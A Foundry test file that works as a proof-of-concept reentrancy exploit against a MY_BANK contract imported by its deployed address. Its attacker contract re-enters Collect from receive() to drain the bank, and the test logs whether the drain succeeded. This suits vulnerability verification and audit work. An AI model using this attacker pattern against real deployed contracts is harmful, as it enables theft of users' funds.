// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xf015c35649c82f5467c9c74b7f28ee67665aad68.sol";

contract ReentrancyAttacker {
    MY_BANK public bank;
    bool private attacking;
    uint public attackAmount;
    uint public depositAmount;

    constructor(address payable _bank, uint _depositAmount) {
        bank = MY_BANK(_bank);
        depositAmount = _depositAmount;
    }

    function depositToBank(uint unlockTime) external {
        bank.Put{value: depositAmount}(unlockTime);
    }

    function reentrancyAttack(uint _amount) external {
        attackAmount = _amount;
        bank.Collect(_amount);
    }

    receive() external payable {
        if (!attacking) {
            attacking = true;
            bank.Collect(attackAmount);
        }
    }
}

contract MY_BANKReentrancyTest is Test {
    Log public logContract;
    MY_BANK public bankContract;
    ReentrancyAttacker public attacker;
    uint constant DEPOSIT_AMOUNT = 1 ether;

    function setUp() public {
        logContract = new Log();
        bankContract = new MY_BANK(address(logContract));
        attacker = new ReentrancyAttacker(payable(address(bankContract)), DEPOSIT_AMOUNT);
        
        // Fund attacker with deposit amount and deposit to bank
        vm.deal(address(attacker), DEPOSIT_AMOUNT);
        attacker.depositToBank(block.timestamp + 1); // Set unlock time to future
        
        // Move time to unlock deposits
        vm.warp(block.timestamp + 2);
        
        // Add extra funds to bank without affecting accounting
        vm.deal(address(bankContract), 2 * DEPOSIT_AMOUNT);
    }

    function testReentrancyVulnerability() public {
        // Capture initial balances for differential check
        console.log("--- BEFORE-Trigger Attack ---");
        uint256 bankBalanceBefore = address(bankContract).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        console.log("Bank balance (before):", bankBalanceBefore);
        console.log("Attacker balance (before):", attackerBalanceBefore);

        // Execute attack
        console.log("--- Trigger Attack ---");
        attacker.reentrancyAttack(DEPOSIT_AMOUNT);
        
        console.log("--- AFTER-Trigger Attack ---");
        uint256 bankBalanceAfter = address(bankContract).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        console.log("Bank balance (after):", bankBalanceAfter);
        console.log("Attacker balance (after):", attackerBalanceAfter);

        // Differential comparison
        bool vulnerabilityExists = 
            bankBalanceAfter == 0 && 
            attackerBalanceAfter == 2 * DEPOSIT_AMOUNT;

        // Final verdict based on differential state changes
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Reentrancy attack successfully drained bank balance");
        } else {
            console.log("Vulnerability not Exist: Bank balances unchanged by attack");
        }
    }
}